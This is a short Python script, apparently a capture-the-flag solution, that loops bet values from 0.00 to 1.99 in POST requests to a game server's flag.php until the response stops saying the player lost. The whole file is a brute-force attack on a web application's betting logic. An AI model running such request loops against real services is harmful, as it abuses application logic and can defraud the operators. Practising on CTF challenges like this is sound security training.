#!/usr/bin/env python
##
import requests

win = False
while not win:
    for cents in range(0, 200):
        dollar = cents / 100.0
        print("Trying %s ->" % str(dollar))
        r = requests.post("http://play.spgame.site:9996/flag.php", data={'bet': str(dollar)})
        reply = r.text
        print(reply)
        if not ('The god of gambler is poor' in reply or "I'am Sorry, but you just lost to the god of gamble" in reply):
            win = True
            break